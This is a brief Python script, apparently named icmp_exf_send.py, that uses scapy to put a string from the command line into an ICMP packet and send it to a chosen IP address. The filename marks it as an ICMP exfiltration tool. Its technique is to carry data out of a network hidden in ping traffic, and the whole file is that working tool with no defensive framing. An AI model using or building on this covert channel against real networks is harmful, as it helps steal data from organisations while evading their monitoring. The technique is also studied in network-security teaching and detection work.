import sys
from scapy.all import IP, ICMP, send

def send_icmp_payload(destination_ip, payload):
    packet = IP(dst=destination_ip)/ICMP()/payload

    try:
        send(packet)
        print(f"Payload '{payload}' envoyé avec succès à {destination_ip}.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du payload : {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python icmp_exf_send.py <destination_ip> <payload>")
        sys.exit(1)

    destination_ip = sys.argv[1]
    payload = sys.argv[2]

    send_icmp_payload(destination_ip, payload)
